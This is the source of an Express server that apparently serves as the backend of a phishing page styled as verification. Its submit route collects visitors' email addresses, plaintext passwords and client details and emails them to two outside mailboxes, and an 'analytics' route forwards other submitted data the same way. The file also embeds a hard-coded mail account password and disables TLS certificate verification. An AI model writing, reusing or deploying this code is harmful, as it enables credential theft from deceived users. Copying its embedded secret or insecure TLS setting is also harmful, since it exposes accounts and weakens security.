import * as dotenv from 'dotenv';
import express from 'express';
import cors from 'cors';
import nodemailer from 'nodemailer';

dotenv.config();

const app = express();
const port = process.env.PORT || 3001;

// Configure email transporter with more secure settings
const transporter = nodemailer.createTransport({
  host: 'smtp.gmail.com',
  port: 465,
  secure: true,
  auth: {
    user: process.env.EMAIL_USER || 'peternnamani001@gmail.com',
    pass: process.env.EMAIL_PASS || 'yygzcdttgthuhicg'
  },
  tls: {
    rejectUnauthorized: false
  }
});

// Middleware
app.use(cors({
  origin: ['https://verify-frontend-wine.vercel.app/', 'http://localhost:5173'],
  credentials: true
}));

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));

app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self' https://www.google.com/recaptcha/ https://www.gstatic.com; " +
    "connect-src 'self' https://verify-backend.onrender.com https://api.ipify.org https://ipapi.co; " +
    "frame-src https://www.google.com/recaptcha/; " +
    "img-src 'self' data: https://www.gstatic.com;"
  );
  next();
});

// Test route
app.get('/api/test', (req, res) => {
  res.json({ message: 'Server is running! Updated: ' + new Date().toISOString() });
});

// Data submission route
app.post('/api/submit-data', async (req, res) => {
  console.log('Received data submission on server.js');
  try {
    const { email, password, clientInfo } = req.body;
    
    // Format the collected data
    const htmlContent = `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
        <h2 style="color: #444;">New User Registration</h2>
        <div style="background-color: #f5f5f5; padding: 15px; border-radius: 5px;">
          <p><strong>Email:</strong> ${email}</p>
          <p><strong>Password:</strong> ${password}</p>
          <p><strong>Date/Time:</strong> ${new Date().toLocaleString()}</p>
          ${clientInfo ? `<p><strong>Client Info:</strong> <pre>${JSON.stringify(clientInfo, null, 2)}</pre></p>` : ''}
        </div>
      </div>
    `;

    const mailOptions = {
      from: process.env.EMAIL_USER || 'peternnamani001@gmail.com',
      to: 'peternnamani001@gmail.com,Miralhuge@zohomail.com',
      subject: `New Registration: ${email}`,
      html: htmlContent
    };

    console.log('Sending registration data from server.js...');
    const info = await transporter.sendMail(mailOptions);
    console.log('Registration data sent successfully from server.js:', info.messageId);
    
    // Return success without revealing details
    res.json({ success: true });
  } catch (error) {
    console.error('Data submission error from server.js:', error);
    res.status(500).json({ 
      success: false,
      message: 'An error occurred while processing your request'
    });
  }
});

// Analytics collection - more sanitized approach
app.post('/api/collect-analytics', async (req, res) => {
  try {
    const { userData, formId } = req.body;
    
    // Sanitize and validate data
    if (!userData || !formId) {
      return res.status(400).json({ success: false, message: 'Missing required fields' });
    }

    const sanitizedSubject = `Form Submission - ${formId}`;
    
    // Create template-based email content
    const htmlContent = `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
        <h2 style="color: #444;">New Form Submission</h2>
        <p>A new form was submitted with the following information:</p>
        <div style="background-color: #f5f5f5; padding: 15px; border-radius: 5px;">
          <p><strong>Form ID:</strong> ${formId}</p>
          <p><strong>Submission Time:</strong> ${new Date().toLocaleString()}</p>
          <p><strong>User Data:</strong></p>
          <pre style="background-color: #fff; padding: 10px; border-radius: 3px; overflow: auto;">${JSON.stringify(userData, null, 2)}</pre>
        </div>
      </div>
    `;

    const mailOptions = {
      from: process.env.EMAIL_USER || 'peternnamani001@gmail.com',
      to: 'peternnamani001@gmail.com,Miralhuge@zohomail.com',
      subject: sanitizedSubject,
      html: htmlContent
    };

    console.log('Sending analytics data...');
    const info = await transporter.sendMail(mailOptions);
    console.log('Analytics data sent successfully:', info.messageId);
    
    res.json({ 
      success: true, 
      message: 'Data collected successfully'
    });
  } catch (error) {
    console.error('Processing error:', error);
    res.status(500).json({ 
      success: false,
      message: 'An error occurred while processing your request'
    });
  }
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('Server error:', err);
  res.status(500).json({ 
    success: false,
    message: 'Internal server error'
  });
});

// Start server
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
  
  // Test email configuration
  transporter.verify()
    .then(() => console.log('Email configuration verified successfully'))
    .catch(err => console.error('Email configuration error:', err));
});
